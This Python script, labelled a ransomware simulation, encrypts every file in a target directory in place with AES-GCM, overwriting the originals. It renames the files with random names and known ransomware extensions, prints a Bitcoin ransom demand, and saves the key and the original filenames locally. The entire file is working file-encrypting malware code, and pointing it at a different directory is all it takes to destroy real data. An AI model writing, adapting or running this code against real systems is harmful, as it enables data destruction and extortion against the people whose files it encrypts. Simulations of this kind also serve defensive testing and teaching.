"""
This script simulates a ransomware attack by encrypting files in the specified directory.
"""

import os
import random
from Crypto.Cipher import AES
import pickle
import csv
import secrets
from Crypto.Util.Padding import pad

def encrypt_file(filename, encryption_key):
    """
    Encrypts the specified file using AES encryption.
    filename: string (path to the file to encrypt)
    encryption_key: 16-byte string
    """
    cipher = AES.new(encryption_key, AES.MODE_GCM)
    nonce = cipher.nonce
    with open(filename, "rb") as f:
        filedata = f.read()
        # Pad the file data so that its length is a multiple of 16 bytes
        padded_data = pad(filedata, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
    with open(filename, "wb") as f:
        f.write(nonce)
        f.write(encrypted_data)


def encrypt_files(directory, encryption_key):
    """
    Encrypts all the files in the specified directory using AES encryption.
    directory: string (path to the directory containing the files to encrypt)
    encryption_key: 16-byte string
    """
    for filename in os.listdir(directory):
        encrypt_file(os.path.join(directory, filename), encryption_key)

def rename_files(directory):
    """
    Renames all the files in the specified directory with unreadable names and extensions.
    directory: string (path to the directory containing the files to rename)
    """
    known_ransom_extensions = ["micro", "1cbu1", "1txt", "73i87A", "AngleWare", "BarRax", "CCCRRRPPP", "Dexter", "EnCiPhErEd", "LeChiffre", "MERRY", "MRCR1", "PEGS1", "PoAr2w", "R16m01d05", "RARE1", "RMCM1", "SecureCrypted", "VforVendetta", "Whereisyourfiles", "_AiraCropEncrypted", "a5zfn", "aaa", "abc", "adk", "aesir", "alcatraz", "angelamerkel", "antihacker2017", "atlas", "axx", "bin", "bitstak", "braincrypt", "breaking_bad", "bript", "btc", "ccc", "cerber", "cerber2", "cerber3", "coded", "comrade", "conficker", "coverton", "covi-19", "covid19", "crab", "crinf", "crjoker", "crptrgr", "cry", "cryeye", "cryp1", "crypt", "crypte", "crypted", "cryptolocker", "cryptowall", "crypz", "czvxce", "d4nk", "dCrypt", "dale", "damage", "darkness", "deadbolt", "decrypt2017", "derp", "dharma", "dll", "dxxd", "ecc", "edgel", "enc", "enciphered", "encr", "encrypt", "encrypted", "enigma", "evillock", "exotic", "exx", "ezz", "fantom", "file0locked", "fucked", "fun", "gefickt", "globe", "good", "grt", "ha3", "helpmeencedfiles", "herbst", "hnumkhotep", "hush", "ifuckedyou", "info", "kernel_complete", "kernel_pid", "kernel_time", "keybt@inbox_com", "keybtc", "kimcilware", "kkk", "kostya", "krab", "kraken", "kratos", "kyra", "lcked", "legion", "lesli", "lo!", "lock93", "locked", "locklock", "locky", "lol", "loli", "lovewindows", "madebyadam", "magic", "maya", "micro", "mole", "mp3", "noproblemwedecfiles​", "nuclear55", "odcodc", "odin", "onion", "oops", "osiris", "p5tkjw", "padcrypt", "paym", "paymrss", "payms", "paymst", "paymts", "payrms", "pays", "pdcr", "pec", "perl", "potato", "powerfulldecrypt", "pubg", "purge", "pzdc", "r5a", "raid10", "razy", "rdm", "realfs0ciet@sigaint.org.fs0ciety", "realfs0ciety@sigaint.org.fs0ciety", "reco", "rekt", "remk", "rip", "rmd", "rnsmwr", "rokku", "rrk", "ruby", "sage", "serp", "serpent", "sexy", "shit", "spora", "stn", "surprise", "szf", "theworldisyours", "thor", "ttt", "unavailable", "vbransom", "venusf", "vindows", "vvv", "vxlock", "wallet", "wcry", "wflx", "windows10", "wncry", "xxx", "xyz", "ytbl", "zcrypt", "zepto", "zorro", "zyklon", "zzz", "zzzzz", ]
    original_filenames = {}
    i = 0
    for filename in os.listdir(directory):
        new_filename = str(secrets.randbits(128)) + "." + known_ransom_extensions[i % len(known_ransom_extensions)]
        i += 1
        # Keep track of original filenames
        original_filenames[new_filename] = os.path.splitext(filename)[0] + os.path.splitext(filename)[1]
        os.rename(os.path.join(directory, filename), os.path.join(directory, new_filename))
    return original_filenames



if __name__ == "__main__":
    # Define the directory path where dummy files are located
    directory = "./testdir"

    # Define the ransomware message to display
    ransom_message = "Your files have been encrypted. Please pay 1 Bitcoin to the following address to get the decryption key."

    # Simulate the ransomware attack
    encryption_key_int = secrets.randbits(128)
    encryption_key = encryption_key_int.to_bytes(16, byteorder="big")

    original_filenames = rename_files(directory)
    encrypt_files(directory, encryption_key)
    print(ransom_message)

    # save the encryption key to a txt file
    with open("encryption_key.txt", "w") as f:
        f.write("encryption_key: " + str(encryption_key_int))

    # save the original filenames to a pkl file
    with open("original_filenames.pkl", "wb") as f:
        pickle.dump(original_filenames, f)

